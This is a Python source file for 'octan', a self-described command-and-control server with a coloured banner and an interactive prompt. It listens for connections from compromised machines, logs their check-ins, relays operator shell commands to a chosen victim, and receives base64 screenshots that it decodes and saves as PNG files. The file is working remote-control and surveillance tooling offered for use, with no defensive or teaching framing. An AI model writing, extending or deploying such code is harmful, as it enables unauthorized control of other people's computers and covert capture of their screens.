#!/usr/bin/python
#################imps
import base64
import os
import random
import socket
import datetime
from colorama import *
from PIL import Image
from term_image.image import from_file
#################rand
def ascii_art():
    print(f"""
{Fore.MAGENTA}   _______   {Fore.WHITE}
{Fore.MAGENTA}  /       \  {Fore.WHITE}    | {Fore.WHITE}Im running on version {Fore.YELLOW}1.0.00{Fore.WHITE}
{Fore.MAGENTA}  | X   X |  {Fore.WHITE}    | {Fore.WHITE}Nr. 9999+ best CC-Server
{Fore.MAGENTA}  |       |  {Fore.WHITE}    | {Fore.WHITE}Report bugs/vulns on Github!
{Fore.MAGENTA} / /\   /\ \ {Fore.WHITE}    | {Fore.WHITE}Use the {Fore.BLUE}help{Fore.WHITE} command
{Fore.MAGENTA}| |  | |  | |{Fore.WHITE}    | {Fore.WHITE}Made by {Fore.RED}dEllTaxa{Fore.WHITE}
{Fore.MAGENTA}\_/  \_/  \_/{Fore.WHITE}    

""")
#################class
class iPrint:
    def event(msg):
        print(f"{Fore.BLUE}[*] {Fore.WHITE}{msg}{Fore.WHITE}")
    def info(msg):
        print(f"{Fore.GREEN}[+] {Fore.WHITE}{msg}{Fore.WHITE}")
    def error(msg):
        print(f"{Fore.RED}[-] {Fore.WHITE}{msg}{Fore.WHITE}")
#################vars
seltar = "*"
server_ip = "0.0.0.0"
server_port = 3009
#################cmds
def getspaces(strin, lenin):
	result = strin
	while result.__len__() < lenin:
		result += " "
	return result
#################defs
def clear():
    payload = "clear"
    if os.name == "nt":
        payload = "cls"
    os.system(payload)

def help():
    print("""./octan [nA] (No args)

default shell:
    [clear] clear the console
    [exit] exit the program

octan shell:
    [display] wait for incomming connections (will not accept any)
    [rhost,lhost,lport] +(val) set the l/rhost and the lport
    [exploit] wac (wait, accept, control) wait for a connection, accept it and control it
""")

def display():
        TCP_IP = server_ip
        TCP_PORT = server_port
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)         
        server.bind((TCP_IP, TCP_PORT))
        server.listen()
            
        print()
        try:
            print(f" {Fore.GREEN}   IPAddress     {Fore.WHITE}| {Fore.GREEN}     Date/Time{Fore.WHITE}      | {Fore.GREEN}INFO{Fore.WHITE}")
            print(f" ------------------------------------------------")
            while True:
                conn, addr = server.accept()
                info = conn.recv(1024)
                ipaddr = addr[0]
                datet = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                fat = (str(info.decode())).replace("<octa::101101::>", "")
                print(f"  {Fore.BLUE}{getspaces(ipaddr, 15)}{Fore.WHITE} | {Fore.YELLOW}{datet}{Fore.WHITE} | {Fore.MAGENTA}{fat}{Fore.WHITE}")
                conn.close()

        except KeyboardInterrupt:
            print()
            pass

def exploit():
    payl = "<octa::101101::>"
    try:
        global seltar
        remote = seltar
        if remote == "*":
            remote = "anyone"
        iPrint.event(f"Waiting for {Fore.BLUE}{remote}{Fore.WHITE} to connect\n")
        
        TCP_IP = server_ip
        TCP_PORT = server_port
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)         
        server.bind((TCP_IP, TCP_PORT))
        server.listen()

        iscorrect = False
        index = 0

        img = ""
        shout = ""
        sh = False
        capt = False
        dontsend = False
        try:
            while True:
                if sh:
                    shout = "sh"
                else:
                    shout = "cc"

                if iscorrect == False:
                    while iscorrect != True:
                        conn, addr = server.accept()
                        if seltar != "*":
                            if addr[0] == seltar:
                                iscorrect = True
                                iPrint.info("Connection established")
                            else:
                                print(addr)
                        else:
                            iscorrect = True
                            iPrint.info("Connection established")
                data = conn.recv(65536)
                if index == 0:
                    print(f"{Fore.GREEN}[+] [INFO] {Fore.WHITE}", end='')
                
                usinput = ""
                if data.decode().endswith(payl):
                    dat = (data.decode()).replace(payl, "")
                    if capt == False:
                        print(dat)
                        usinput = input(f"{Fore.BLUE}[{shout}][shell]{Fore.WHITE}"+prompt())
                else:
                    dat = data.decode()
                    if capt == False:
                        print(dat)
                
                if capt:
                    img += dat
                    if data.decode().endswith(payl):
                        datet = datetime.datetime.now().strftime("%Y_%m_%d_%H_%M_%S")
                        imgdata = base64.b64decode(img)
                        filename = datet + "_" + str(random.randint(111111, 999999)) + ".png"
                        with open("pics/"+filename, 'wb') as f:
                            f.write(imgdata)
                        imgdata = ""
                        img = ""
                        capt = False
                        print(f"{Fore.GREEN}[+]{Fore.WHITE} Image saved as '{Fore.BLUE}{filename}{Fore.WHITE}'")
                        usinput = "recon"
                        # usinput = input(f"{Fore.BLUE}[{shout}][shell]{Fore.WHITE}"+prompt())
                

                if usinput.startswith("view") and usinput.endswith(".png"):
                    dontsend = True
                    file = usinput[4:].strip()
                    
                    try:
                        image = from_file(file)
                        print(image)
                    except FileNotFoundError:
                        print(f"{Fore.RED}[-]{Fore.WHITE} Image not found!")
                elif usinput.startswith("show") and usinput.endswith(".png"):
                    dontsend = True
                    file = usinput[4:].strip()

                    try:
                        img = Image.open(file)
                        img.show()
                    except FileNotFoundError:
                        print(f"{Fore.RED}[-]{Fore.WHITE} Image not found!")
                elif usinput == "lshots":
                    dontsend = True

                    files = os.listdir("pics")
                    for file in files:
                        if file.strip().endswith(".png"):
                            print(f"{Fore.MAGENTA}{file}{Fore.WHITE}")
                elif usinput.strip() == "":
                    dontsend = True
                elif usinput.strip() == "clear":
                    clear()
                    dontsend = True

                if usinput.strip() == "shell":
                    sh = True
                
                if usinput.strip() == "exit" and sh == True:
                    sh = False

                if dontsend == False:
                    conn.send(usinput.encode())
                else:
                    dontsend = False
                    conn.send(("empty").encode())

                if usinput.strip() == "close":
                    break
                elif usinput.strip() == "cap":
                    capt = True
                
                data = ""
                index += 1
        except KeyboardInterrupt:
            pass
        conn.close()

    except KeyboardInterrupt:
        pass
#################defs
def prompt():
    return f"{Fore.MAGENTA}octan{Fore.WHITE}_{Fore.GREEN}{server_ip}{Fore.WHITE}<({Fore.BLUE}{seltar}{Fore.WHITE}){Fore.YELLOW}>>{Fore.WHITE} "

def shell():
    try:
        while True:
            incmd = input(prompt())

            if incmd.strip().__len__() == 0:
                continue

            incmd_split = incmd.split()
            incmd_name = incmd_split[0]

            global server_ip
            global server_port
            global seltar

            if incmd_name == "clear":
                clear()
            elif incmd_name == "exit":
                exit()
            elif incmd_name == "help":
                help()
            elif incmd_name == "display":
                display()
            elif incmd_name == "exploit":
                exploit()
            elif incmd_name.startswith("lport"):
                if incmd_split.__len__() >= 2:
                    try:
                        inttt = 1234567890
                        inttt = int(incmd_split[1].strip())
                        if inttt > 65500:
                            iPrint.error(f"{Fore.GREEN}{inttt}{Fore.WHITE} is not an valid Port\n")
                        else:
                            server_port = inttt
                            iPrint.info(f"lport was set to {Fore.GREEN}{server_port}\n")
                    except ValueError:
                        iPrint.error(f"Cannot convert {Fore.BLUE}str{Fore.WHITE} to {Fore.GREEN}int{Fore.WHITE}\n")
            elif incmd_name.startswith("rhost"):
                if incmd_split.__len__() >= 2:
                    seltar = incmd_split[1].strip()
                    iPrint.info(f"lhost was set to {Fore.GREEN}{seltar}\n")
            elif incmd_name.startswith("lhost"):
                if incmd_split.__len__() >= 2:
                    server_ip = incmd_split[1].strip()
                    iPrint.info(f"lhost was set to {Fore.GREEN}{server_ip}\n")
            else:
                iPrint.error(f"Cmd not found, for help use '{Fore.BLUE}help{Fore.WHITE}'\n")
            
    except KeyboardInterrupt:
        print("")
        exit()

#################main
def main():
    if os.listdir().__contains__("pics") == False:
        os.mkdir("pics")
    ascii_art()
    shell()

if __name__ == "__main__":
    main()